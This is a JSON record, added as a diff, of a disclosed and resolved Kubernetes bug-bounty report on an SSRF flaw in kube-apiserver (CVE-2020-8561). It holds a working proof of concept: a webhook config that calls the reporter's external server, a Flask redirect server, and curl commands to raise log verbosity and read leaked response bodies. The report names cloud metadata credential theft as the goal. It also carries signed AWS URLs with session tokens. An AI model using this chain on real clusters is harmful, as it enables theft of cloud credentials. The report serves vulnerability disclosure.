@@ -1,0 +1,236 @@
+{
+  "id": 941178,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDExNzg=",
+  "url": "https://hackerone.com/reports/941178",
+  "title": "SSRF for kube-apiserver cloudprovider scene",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-24T12:41:44.871Z",
+  "submitted_at": "2020-07-24T12:41:44.871Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lazydog",
+    "url": "/lazydog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8561"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-10-07T18:03:40.296Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-10-07T17:57:35.574Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\nattacker can create admissionwebhook cause ssrf in cloudprovider server.\ncloudprovider like GKE AKS EKS.\n\n## Kubernetes Version:\nkubernetes v1.18.6\n\n## Component Version:\nDocker version 19.03.6, build 369ce74a3c\n\n## Steps To Reproduce:\n1. use follwing command create v1.18.6 kubernetes, wait for the download  process done. \n\n`minikube start --vm-driver=none --kubernetes-version='v1.18.6'`\n\n2.edit `kube-apiserver` options in following path.\n\n```\n/etc/kubernetes/manifests/kube-apiserver.yaml\n\nadd some options to  spec.containers.command field.  see pic1\n--log-dir=/var/log\n--logtostderr=false\n```\n\n{F920720}\n\n3.save following yaml file to disk as poc1.yaml, and run command` kubectl create poc1.yaml`.\n\npoc1.yaml \n```\napiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: test.config.xxx.io\nwebhooks:\n- name: test.config.xxx.io\n  rules:\n  - apiGroups:   [\"\"]\n    apiVersions: [\"v1\", \"v1beta1\"]\n    operations:  [\"CREATE\",\"DELETE\",\"UPDATE\"]\n    resources:   [\"serviceaccounts\"]\n    scope:       \"*\"\n  clientConfig:\n    # modify with your poc2 webserver\n    url: \"https://lazydog.me/aa\"\n    # if webserver using self-signed certificate must be add caBundle\n    # caBundle: \"\"\n  admissionReviewVersions: [\"v1\", \"v1beta1\"]\n  sideEffects: None\n  timeoutSeconds: 5\n```\n\n4.use `pip install Flask` to install flask deps, and run `FLASK_ENV=development FLASK_APP=poc1 flask run`. if you using self-signed certificate must be add `--cert PATH --key PATH` arguments to command.\n\npoc2.py\n```python\nfrom flask import Flask, redirect, request, Response\n\napp = Flask(__name__)\n\napp.port = 80\n\n\n@app.route('/<path:path>', methods=['POST','GET'])\ndef index(path=''):\n    resp = ''\n    print(request.headers)\n    if path == 'test':\n        res = Response(\"test\")\n        res.headers[\"Content-Type\"] = \"application/vnd.kubernetes.protobuf\"\n        return res\n\n    return redirect('http://www.tencent.com/')\n```\n\n5.use `kubectl proxy &` start a apiserver proxy to localhost,and set` klog` level to 10. if not set klog level to 10 is can only recv http failed code response body.\n```\ncurl -XPUT --data \"10\" http://localhost:8001/debug/flags/v\n```\n\n6.now we can create a serviceaccount let apiserver to request our evil webserver use this command `kubectl create sa testpoc`.\n\n{F920762}\n\n7.use `curl http://localhost:8001/logs/kube-apiserver.INFO` to find full response body, is may be include `Response Body:` strings.\n\n{F920768}\n\n\n\n## Supporting Material/References:\n\n- klog set to 10 root cause. https://github.com/kubernetes/client-go/blob/31e286ee1926a84e0bfd4c8c8c77b3816f98244a/rest/request.go#L1072\n- This link let our know gke is enabled logs handler https://groups.google.com/g/kubernetes-users/c/gHHhl0hI7GU\n\n## Impact\n\nI think this case is like ` CVE-2020–8555`,  attacker can cause a full response body ssrf in cloudprovider inner server.\n\nif redirect url is metadata server maybe can leak some credentials or other sensitive information.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 920720,
+      "file_name": "pic1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QgLdxs68JxcntdUFcpruu8eR?response-content-disposition=attachment%3B%20filename%3D%22pic1.png%22%3B%20filename%2A%3DUTF-8%27%27pic1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT56MY43B%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T054728Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIQDHVI9HIxFQ%2Fz6z8zkub6NzxSd8Xem3M%2F4cFY9P7avfrAIgSJEyEuHJaO%2F%2FsfHqUMFp8REgnCTx5wbsQqRew0HS4isqsQUIBhADGgwwMTM2MTkyNzQ4NDkiDJP7GGJOItEpwG4gKiqOBSap%2FBIdAFzHF7f%2F2z99pWX4gkN0XClC1bDOnvAcDlnnvylyrfauNfPDsLR%2FLD4KCOnpvfi2c9HrIJoc%2FCk1C636IbgdhBVgnryL8zFCf6Jjr1gaL8VRf%2B9yZuuWiWApr7YUG8j6koCkn%2BtIz7Sdjt6hBIzSrj87k1LFMsJnCU2Rv0Jc0XUEfGaCx0lqzOOBx4rwr3UOuZLOgPv%2B56FlR2Wk%2BANr19GlDrKnawMZ2aBbb%2F99Rbj9VKWCkRYrNsZ%2BZbmngjaTtJufgxCKfw%2B2m%2FE1DMLAKVwecA1Z5yW%2FJ99HXKPeocEekeBbKQivqGsE2G6FT9iFYMf2OIHo1MSwzHTbT5JGiwV1xudKJ6eWYXZCRMxU4niy%2FgjXpYQSFCfo%2B4nYqqcIJveYxnhXGszB04SZY3RCMsy05B5ksDQVhMjqxGQfYQOYbbWNKYEWofqmCwl4%2BZWhugeIDDDt%2FGmpUqFDKH72exzV1oJ%2Ftaan9bi4bjWrnHIq2TpYrlPoXhNpZZJwh3Mh9Ol2%2Fc5NCXzcHQX3TVMyW7WxjlgLamktSgBeldvg58owwGtLfLXIIfsRLyrDqWuKGp0hzxIbfG34MlGu7EV0fwwcfTPcOxGl7ld84b6Ll2We9pB9gh%2FDvPnEnsnHMrdKqqEJKctIioQHclj5rq3o9deOWj2MAtifWnEZNULO2GkQ1PCgCiAbjQ8ec3kZMK8h%2BKPJPLIGYgXbhF%2B7bN1hTYuxeaqdrQ3MVZgvj0creVx7Duuef6ep3QzJWzPpK8uSwF2eHw8c2XaKpmQxeFu4zftZgNk0WvUU5Wb%2Bcj0CHFKgAlOoAd0E8dMGWsuE4ippgVdP87%2FYRSXj%2Bo80XlYUsADGQyF9oEV9JjCNip3SBjqxAZEvldMmm2qy%2FJ5iGvzUD92ilL%2FjrFZLiDhyri075Ob4aNGgv6dD%2B5tw0wwsbvJjEBsOuMWwyTYlP13PCCH%2FdOX2EgBhkfkENCKzV2ak30ICN%2F86IBgy1payWhb%2BVI3oKyaI%2B8WyLUjPMlE%2F7peV7HamAvk4VmBK9POZph3UNFFdoscTzJ80qomsyTrR0wGwWor9lgsJBkDoZ4Hm79bgbHXYVi4riWhNAHnEGX6ZwGW%2FtQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6906667bea58c870ca76f212d28fee22c996dce40a4712ec828b4dde6fd5c58",
+      "file_size": 67806,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 920762,
+      "file_name": "pic2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6GoKDfNBWcQvJmbAGBUwbVBR?response-content-disposition=attachment%3B%20filename%3D%22pic2.png%22%3B%20filename%2A%3DUTF-8%27%27pic2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT56MY43B%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T054728Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIQDHVI9HIxFQ%2Fz6z8zkub6NzxSd8Xem3M%2F4cFY9P7avfrAIgSJEyEuHJaO%2F%2FsfHqUMFp8REgnCTx5wbsQqRew0HS4isqsQUIBhADGgwwMTM2MTkyNzQ4NDkiDJP7GGJOItEpwG4gKiqOBSap%2FBIdAFzHF7f%2F2z99pWX4gkN0XClC1bDOnvAcDlnnvylyrfauNfPDsLR%2FLD4KCOnpvfi2c9HrIJoc%2FCk1C636IbgdhBVgnryL8zFCf6Jjr1gaL8VRf%2B9yZuuWiWApr7YUG8j6koCkn%2BtIz7Sdjt6hBIzSrj87k1LFMsJnCU2Rv0Jc0XUEfGaCx0lqzOOBx4rwr3UOuZLOgPv%2B56FlR2Wk%2BANr19GlDrKnawMZ2aBbb%2F99Rbj9VKWCkRYrNsZ%2BZbmngjaTtJufgxCKfw%2B2m%2FE1DMLAKVwecA1Z5yW%2FJ99HXKPeocEekeBbKQivqGsE2G6FT9iFYMf2OIHo1MSwzHTbT5JGiwV1xudKJ6eWYXZCRMxU4niy%2FgjXpYQSFCfo%2B4nYqqcIJveYxnhXGszB04SZY3RCMsy05B5ksDQVhMjqxGQfYQOYbbWNKYEWofqmCwl4%2BZWhugeIDDDt%2FGmpUqFDKH72exzV1oJ%2Ftaan9bi4bjWrnHIq2TpYrlPoXhNpZZJwh3Mh9Ol2%2Fc5NCXzcHQX3TVMyW7WxjlgLamktSgBeldvg58owwGtLfLXIIfsRLyrDqWuKGp0hzxIbfG34MlGu7EV0fwwcfTPcOxGl7ld84b6Ll2We9pB9gh%2FDvPnEnsnHMrdKqqEJKctIioQHclj5rq3o9deOWj2MAtifWnEZNULO2GkQ1PCgCiAbjQ8ec3kZMK8h%2BKPJPLIGYgXbhF%2B7bN1hTYuxeaqdrQ3MVZgvj0creVx7Duuef6ep3QzJWzPpK8uSwF2eHw8c2XaKpmQxeFu4zftZgNk0WvUU5Wb%2Bcj0CHFKgAlOoAd0E8dMGWsuE4ippgVdP87%2FYRSXj%2Bo80XlYUsADGQyF9oEV9JjCNip3SBjqxAZEvldMmm2qy%2FJ5iGvzUD92ilL%2FjrFZLiDhyri075Ob4aNGgv6dD%2B5tw0wwsbvJjEBsOuMWwyTYlP13PCCH%2FdOX2EgBhkfkENCKzV2ak30ICN%2F86IBgy1payWhb%2BVI3oKyaI%2B8WyLUjPMlE%2F7peV7HamAvk4VmBK9POZph3UNFFdoscTzJ80qomsyTrR0wGwWor9lgsJBkDoZ4Hm79bgbHXYVi4riWhNAHnEGX6ZwGW%2FtQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bbddb25ca15bc6e5fb4c801c3ba900ffba7386501b9b9a342d6c024c884537fc",
+      "file_size": 164646,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 920768,
+      "file_name": "pic3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RUTBqU3YNtytz9s2djPzJLDu?response-content-disposition=attachment%3B%20filename%3D%22pic3.png%22%3B%20filename%2A%3DUTF-8%27%27pic3.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT56MY43B%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T054728Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIQDHVI9HIxFQ%2Fz6z8zkub6NzxSd8Xem3M%2F4cFY9P7avfrAIgSJEyEuHJaO%2F%2FsfHqUMFp8REgnCTx5wbsQqRew0HS4isqsQUIBhADGgwwMTM2MTkyNzQ4NDkiDJP7GGJOItEpwG4gKiqOBSap%2FBIdAFzHF7f%2F2z99pWX4gkN0XClC1bDOnvAcDlnnvylyrfauNfPDsLR%2FLD4KCOnpvfi2c9HrIJoc%2FCk1C636IbgdhBVgnryL8zFCf6Jjr1gaL8VRf%2B9yZuuWiWApr7YUG8j6koCkn%2BtIz7Sdjt6hBIzSrj87k1LFMsJnCU2Rv0Jc0XUEfGaCx0lqzOOBx4rwr3UOuZLOgPv%2B56FlR2Wk%2BANr19GlDrKnawMZ2aBbb%2F99Rbj9VKWCkRYrNsZ%2BZbmngjaTtJufgxCKfw%2B2m%2FE1DMLAKVwecA1Z5yW%2FJ99HXKPeocEekeBbKQivqGsE2G6FT9iFYMf2OIHo1MSwzHTbT5JGiwV1xudKJ6eWYXZCRMxU4niy%2FgjXpYQSFCfo%2B4nYqqcIJveYxnhXGszB04SZY3RCMsy05B5ksDQVhMjqxGQfYQOYbbWNKYEWofqmCwl4%2BZWhugeIDDDt%2FGmpUqFDKH72exzV1oJ%2Ftaan9bi4bjWrnHIq2TpYrlPoXhNpZZJwh3Mh9Ol2%2Fc5NCXzcHQX3TVMyW7WxjlgLamktSgBeldvg58owwGtLfLXIIfsRLyrDqWuKGp0hzxIbfG34MlGu7EV0fwwcfTPcOxGl7ld84b6Ll2We9pB9gh%2FDvPnEnsnHMrdKqqEJKctIioQHclj5rq3o9deOWj2MAtifWnEZNULO2GkQ1PCgCiAbjQ8ec3kZMK8h%2BKPJPLIGYgXbhF%2B7bN1hTYuxeaqdrQ3MVZgvj0creVx7Duuef6ep3QzJWzPpK8uSwF2eHw8c2XaKpmQxeFu4zftZgNk0WvUU5Wb%2Bcj0CHFKgAlOoAd0E8dMGWsuE4ippgVdP87%2FYRSXj%2Bo80XlYUsADGQyF9oEV9JjCNip3SBjqxAZEvldMmm2qy%2FJ5iGvzUD92ilL%2FjrFZLiDhyri075Ob4aNGgv6dD%2B5tw0wwsbvJjEBsOuMWwyTYlP13PCCH%2FdOX2EgBhkfkENCKzV2ak30ICN%2F86IBgy1payWhb%2BVI3oKyaI%2B8WyLUjPMlE%2F7peV7HamAvk4VmBK9POZph3UNFFdoscTzJ80qomsyTrR0wGwWor9lgsJBkDoZ4Hm79bgbHXYVi4riWhNAHnEGX6ZwGW%2FtQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8ebb109c1c4856814742998146ae645c9d9a89a2b74d586145a20a1996e0fd38",
+      "file_size": 373532,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-11-06T17:57:35.682Z",
+  "allow_singular_disclosure_after": -146836193.31614247,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "mr-medi",
+    "lazydog",
+    "yxw21",
+    "alp",
+    "mmdz",
+    "akashhamal0x01",
+    "pacmanx",
+    "demonia",
+    "khizer47",
+    "sa1tama0",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32503,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/apiserver",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "941178",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2021-10-07T18:03:40.145Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:47:29.105555",
+    "source": "https://hackerone.com/reports/941178.json",
+    "report_id": 941178
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDExNzg=",
+    "databaseId": "941178",
+    "title": "SSRF for kube-apiserver cloudprovider scene",
+    "url": "https://hackerone.com/reports/941178",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-10-07T18:03:40.296Z",
+    "created_at": "2020-07-24T12:41:44.871Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 6.8
+    },
+    "reporter": {
+      "username": "lazydog"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5Mzg2",
+      "handle": "kubernetes",
+      "name": "Kubernetes",
+      "url": "https://hackerone.com/kubernetes",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMzU5ODA=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-07-30T16:25:10.523Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzk0MTE3OA==",
+    "_id": "941178",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2021-10-07T18:03:40.145Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDExNzg=",
+      "databaseId": "941178",
+      "title": "SSRF for kube-apiserver cloudprovider scene",
+      "url": "https://hackerone.com/reports/941178",
+      "disclosed_at": "2021-10-07T18:03:40.296Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5Mzg2",
+      "handle": "kubernetes",
+      "name": "Kubernetes",
+      "url": "https://hackerone.com/kubernetes",
+      "currency": "usd"
+    }
+  }
+}
